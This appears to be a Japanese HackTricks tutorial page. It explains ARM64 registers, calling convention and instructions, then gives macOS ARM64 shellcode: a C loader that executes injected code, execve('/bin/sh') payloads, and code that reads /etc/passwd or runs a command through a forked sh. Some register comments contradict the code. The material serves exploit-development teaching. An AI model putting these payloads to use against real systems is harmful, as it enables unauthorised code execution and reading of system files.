# ARM64の概要

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ企業で働いていますか？** **HackTricksで会社を宣伝**したいですか？または、**PEASSの最新バージョンにアクセス**したいですか？または、**HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけてください。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。
* [**公式のPEASS＆HackTricks swag**](https://peass.creator-spring.com)を手に入れましょう。
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **ハッキングのトリックを共有する**ために、[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud)にPRを提出してください。

</details>

## **ARM64の概要**

ARM64、またはARMv8-Aは、スマートフォン、タブレット、サーバー、さらには一部のハイエンドのパーソナルコンピュータ（macOS）など、さまざまなタイプのデバイスで使用される64ビットプロセッサアーキテクチャです。これは、省電力なプロセッサ設計で知られる企業であるARM Holdingsの製品です。

### **レジスタ**

ARM64には、`x0`から`x30`までの**31個の汎用レジスタ**があります。各レジスタは**64ビット**（8バイト）の値を格納できます。32ビットの値のみを必要とする操作では、同じレジスタには`w0`から`w30`までの名前で32ビットモードでアクセスできます。

1. **`x0`**から**`x7`** - これらは通常、スクラッチレジスタとサブルーチンへのパラメータの渡しに使用されます。
* **`x0`**は関数の戻り値も保持します。
2. **`x8`** - Linuxカーネルでは、`x8`は`svc`命令のシステムコール番号として使用されます。**macOSではx16が使用されます！**
3. **`x9`**から**`x15`** - 一時レジスタであり、ローカル変数によく使用されます。
4. **`x16`**と**`x17`** - 一時レジスタであり、間接関数呼び出しやPLT（Procedure Linkage Table）スタブにも使用されます。
* **`x16`**は**`svc`**命令の**システムコール番号**として使用されます。
5. **`x18`** - プラットフォームレジスタです。一部のプラットフォームでは、このレジスタはプラットフォーム固有の用途に予約されています。
6. **`x19`**から**`x28`** - これらは呼び出し元のために値を保持する必要がある呼び出し先保存レジスタです。
7. **`x29`** - **フレームポインタ**。
8. **`x30`** - リンクレジスタ。`BL`（Branch with Link）または`BLR`（Branch with Link to Register）命令が実行されるときに返されるアドレスを保持します。
9. **`sp`** - **スタックポインタ**。スタックの先頭を追跡するために使用されます。
10. **`pc`** - **プログラムカウンタ**。次に実行される命令を指します。

### **呼び出し規約**

ARM64の呼び出し規約では、関数への最初の8つのパラメータはレジスタ**`x0`から`x7`**に渡されます。**追加の**パラメータは**スタック**上に渡されます。**戻り値**はレジスタ**`x0`**に返されます。128ビットの場合は**`x1`**にも返されます。**`x19`**から**`x30`**と**`sp`**レジスタは、関数呼び出しの間に**保存**する必要があります。

アセンブリで関数を読む場合は、**関数のプロローグとエピローグ**を探します。**プロローグ**では通常、**フレームポインタ（`x29`）を保存**し、**新しいフレームポインタを設定**し、**スタックスペースを割り当て**ます。**エピローグ**では通常、**保存されたフレームポインタを復元**し、関数から**戻ります**。

### **一般的な命令**

ARM64の命令は一般的に**`opcode dst, src1, src2`**の形式を持ちます。ここで、**`opcode`**は実行する**操作**（`add`、`sub`、`mov`など）を示し、**`dst`**は結果が格納される**宛先**レジスタであり、**`src1`**と**`src2`**は**ソース**レジスタです。ソースレジスタの代わりに即値を使用することもできます。

* **`mov`**: 1つの**レジスタ**から別の**レジスタ**に値を**移動**します。
* 例: `mov x0, x1` — これは`x1`から`x0`に値を移動します。
* **`ldr`**: **メモリ**から**値**を**レジスタ**に**ロード**します。
* 例: `ldr x0, [x1]` — これは`x1`が指すメモリ位置から値を`x0`にロードします。
* **`str`**: **レジスタ**の**値**を**メモリ**に**ストア**します。
* 例: `str x0, [x1]` — これは`x0`の値を`x1`が指すメモリ位置にストアします。
* **`ldp`**: **レジスタのペア**を**連続するメモリ**から**ロード**します。メモリアドレスは通常、別のレジスタの値にオフセットを加えることで形成されます。
*
* **`mul`**: **2つのレジスタ**の値を**掛け算**し、結果をレジスタに格納します。
* 例: `mul x0, x1, x2` — `x1`と`x2`の値を掛け算し、結果を`x0`に格納します。
* **`div`**: 1つのレジスタの値を別のレジスタで割り、結果をレジスタに格納します。
* 例: `div x0, x1, x2` — `x1`の値を`x2`で割り、結果を`x0`に格納します。
* **`bl`**: **リンク付き分岐**で、**サブルーチン**を**呼び出す**ために使用されます。**戻りアドレスを`x30`に格納**します。
* 例: `bl myFunction` — `myFunction`関数を呼び出し、戻りアドレスを`x30`に格納します。
* **`blr`**: **レジスタで指定された**ターゲットの**サブルーチン**を**呼び出す**ために使用されます。**戻りアドレスを`x30`に格納**します。
* 例: `blr x1` — `x1`に格納されたアドレスの関数を呼び出し、戻りアドレスを`x30`に格納します。
* **`ret`**: **サブルーチンからの戻り**を行います。通常は**`x30`**のアドレスを使用します。
* 例: `ret` — 現在のサブルーチンから`x30`の戻りアドレスを使用して戻ります。
* **`cmp`**: 2つのレジスタを比較し、条件フラグを設定します。
* 例: `cmp x0, x1` — `x0`と`x1`の値を比較し、条件フラグを適切に設定します。
* **`b.eq`**: 前の`cmp`命令に基づいて**等しい場合に分岐**します。
* 例: `b.eq label` — 前の`cmp`命令で2つの値が等しい場合、`label`にジャンプします。
* **`b.ne`**: **等しくない場合に分岐**します。この命令は条件フラグをチェックし（前の比較命令で設定された）、比較された値が等しくない場合、ラベルまたはアドレスに分岐します。
* 例: `cmp x0, x1`命令の後、`b.ne label` — `x0`と`x1`の値が等しくない場合、`label`にジャンプします。
* **`cbz`**: **ゼロの場合に比較して分岐**します。この命令はレジスタとゼロを比較し、等しい場合はラベルまたはアドレスに分岐します。
* 例: `cbz x0, label` — `x0`の値がゼロの場合、`label`にジャンプします。
* **`cbnz`**: **ゼロでない場合に比較して分岐**します。この命令はレジスタとゼロを比較し、等しくない場合はラベルまたはアドレスに分岐します。
* 例: `cbnz x0, label` — `x0`の値がゼロでない場合、`label`にジャンプします。
* **`adrp`**: シンボルの**ページアドレス**を計算し、レジスタに格納します。
* 例: `adrp x0, symbol` — `symbol`のページアドレスを計算し、`x0`に格納します。
* **`ldrsw`**: メモリから**符号付き32ビット**値を**64ビットに拡張**してロードします。
* 例: `ldrsw x0, [x1]` — `x1`が指すメモリ位置から符号付き32ビット値をロードし、64ビットに拡張して`x0`に格納します。
* **`stur`**: 別のレジスタからのオフセットを使用して、レジスタの値をメモリ位置に格納します。
* 例: `stur x0, [x1, #4]` — `x1`に現在格納されているアドレスよりも4バイト大きいメモリアドレスに`x0`の値を格納します。
* **`svc`**: **システムコール**を行います。"Supervisor Call"の略です。プロセッサがこの命令を実行すると、ユーザーモードからカーネルモードに切り替わり、カーネルのシステムコール処理コードが格納されているメモリの特定の場所にジャンプします。
* 例:

```armasm
mov x8, 93  ; システムコール番号（exitの場合は93）をレジスタx8にロードします。
mov x0, 0   ; 終了ステータスコード（0）をレジスタx0にロードします。
svc 0       ; システムコールを実行します。
```

## macOS

### syscalls

[**syscalls.master**](https://opensource.apple.com/source/xnu/xnu-1504.3.12/bsd/kern/syscalls.master)を参照してください。

### シェルコード

コンパイルするには:

{% code overflow="wrap" %}
```bash
as -o shell.o shell.s
ld -o shell shell.o -macosx_version_min 13.0 -lSystem -L /Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/lib
```
{% endcode %}

バイトを抽出するには：
```bash
# Code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/helper/extract.sh
for c in $(objdump -d "s.o" | grep -E '[0-9a-f]+:' | cut -f 1 | cut -d : -f 2) ; do
echo -n '\\x'$c
done
```
<details>

<summary>シェルコードをテストするためのCコード</summary>
```c
// code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/helper/loader.c
// gcc loader.c -o loader
#include <stdio.h>
#include <sys/mman.h>
#include <string.h>
#include <stdlib.h>

int (*sc)();

char shellcode[] = "<INSERT SHELLCODE HERE>";

int main(int argc, char **argv) {
printf("[>] Shellcode Length: %zd Bytes\n", strlen(shellcode));

void *ptr = mmap(0, 0x1000, PROT_WRITE | PROT_READ, MAP_ANON | MAP_PRIVATE | MAP_JIT, -1, 0);

if (ptr == MAP_FAILED) {
perror("mmap");
exit(-1);
}
printf("[+] SUCCESS: mmap\n");
printf("    |-> Return = %p\n", ptr);

void *dst = memcpy(ptr, shellcode, sizeof(shellcode));
printf("[+] SUCCESS: memcpy\n");
printf("    |-> Return = %p\n", dst);

int status = mprotect(ptr, 0x1000, PROT_EXEC | PROT_READ);

if (status == -1) {
perror("mprotect");
exit(-1);
}
printf("[+] SUCCESS: mprotect\n");
printf("    |-> Return = %d\n", status);

printf("[>] Trying to execute shellcode...\n");

sc = ptr;
sc();

return 0;
}
```
</details>

#### シェル

[**ここから**](https://github.com/daem0nc0re/macOS\_ARM64\_Shellcode/blob/master/shell.s)取得し、説明します。

{% tabs %}
{% tab title="adrを使用" %}
```armasm
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
adr  x0, sh_path  ; This is the address of "/bin/sh".
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.
mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

sh_path: .asciz "/bin/sh"
```
{% tab title="スタックを使用して" %}
```armasm
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
; We are going to build the string "/bin/sh" and place it on the stack.

mov  x1, #0x622F  ; Move the lower half of "/bi" into x1. 0x62 = 'b', 0x2F = '/'.
movk x1, #0x6E69, lsl #16 ; Move the next half of "/bin" into x1, shifted left by 16. 0x6E = 'n', 0x69 = 'i'.
movk x1, #0x732F, lsl #32 ; Move the first half of "/sh" into x1, shifted left by 32. 0x73 = 's', 0x2F = '/'.
movk x1, #0x68, lsl #48   ; Move the last part of "/sh" into x1, shifted left by 48. 0x68 = 'h'.

str  x1, [sp, #-8] ; Store the value of x1 (the "/bin/sh" string) at the location `sp - 8`.

; Prepare arguments for the execve syscall.

mov  x1, #8       ; Set x1 to 8.
sub  x0, sp, x1   ; Subtract x1 (8) from the stack pointer (sp) and store the result in x0. This is the address of "/bin/sh" string on the stack.
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.

; Make the syscall.

mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

```
{% endtab %}
{% endtabs %}

#### catコマンドで読む

目標は、`execve("/bin/cat", ["/bin/cat", "/etc/passwd"], NULL)`を実行することです。したがって、第二引数（x1）はパラメータの配列である必要があります（メモリ上ではアドレスのスタックを意味します）。
```armasm
.section __TEXT,__text     ; Begin a new section of type __TEXT and name __text
.global _main              ; Declare a global symbol _main
.align 2                   ; Align the beginning of the following code to a 4-byte boundary

_main:
; Prepare the arguments for the execve syscall
sub sp, sp, #48        ; Allocate space on the stack
mov x1, sp             ; x1 will hold the address of the argument array
adr x0, cat_path
str x0, [x1]           ; Store the address of "/bin/cat" as the first argument
adr x0, passwd_path    ; Get the address of "/etc/passwd"
str x0, [x1, #8]       ; Store the address of "/etc/passwd" as the second argument
str xzr, [x1, #16]     ; Store NULL as the third argument (end of arguments)

adr x0, cat_path
mov x2, xzr            ; Clear x2 to hold NULL (no environment variables)
mov x16, #59            ; Load the syscall number for execve (59) into x8
svc 0                  ; Make the syscall


cat_path: .asciz "/bin/cat"
.align 2
passwd_path: .asciz "/etc/passwd"
```
#### メインプロセスが終了しないように、フォークからshを使用してコマンドを呼び出す

Sometimes, when executing a command from a forked process, the main process gets terminated. To avoid this, you can use the `sh` command to invoke the desired command. This way, the main process will not be killed.

時には、フォークされたプロセスからコマンドを実行すると、メインプロセスが終了してしまうことがあります。これを避けるために、`sh`コマンドを使用して目的のコマンドを呼び出すことができます。これにより、メインプロセスは終了されません。
```armasm
.section __TEXT,__text     ; Begin a new section of type __TEXT and name __text
.global _main              ; Declare a global symbol _main
.align 2                   ; Align the beginning of the following code to a 4-byte boundary

_main:
; Prepare the arguments for the fork syscall
mov x16, #2            ; Load the syscall number for fork (2) into x8
svc 0                  ; Make the syscall
cmp x1, #0             ; In macOS, if x1 == 0, it's parent process, https://opensource.apple.com/source/xnu/xnu-7195.81.3/libsyscall/custom/__fork.s.auto.html
beq _loop              ; If not child process, loop

; Prepare the arguments for the execve syscall

sub sp, sp, #64        ; Allocate space on the stack
mov x1, sp             ; x1 will hold the address of the argument array
adr x0, sh_path
str x0, [x1]           ; Store the address of "/bin/sh" as the first argument
adr x0, sh_c_option    ; Get the address of "-c"
str x0, [x1, #8]       ; Store the address of "-c" as the second argument
adr x0, touch_command  ; Get the address of "touch /tmp/lalala"
str x0, [x1, #16]      ; Store the address of "touch /tmp/lalala" as the third argument
str xzr, [x1, #24]     ; Store NULL as the fourth argument (end of arguments)

adr x0, sh_path
mov x2, xzr            ; Clear x2 to hold NULL (no environment variables)
mov x16, #59           ; Load the syscall number for execve (59) into x8
svc 0                  ; Make the syscall


_exit:
mov x16, #1            ; Load the syscall number for exit (1) into x8
mov x0, #0             ; Set exit status code to 0
svc 0                  ; Make the syscall

_loop: b _loop

sh_path: .asciz "/bin/sh"
.align 2
sh_c_option: .asciz "-c"
.align 2
touch_command: .asciz "touch /tmp/lalala"
```
<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ企業**で働いていますか？ **HackTricksで会社を宣伝**したいですか？または、**最新バージョンのPEASSにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけてください。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。
* [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう。
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **ハッキングのトリックを共有するには、PRを** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **に提出してください。**

</details>
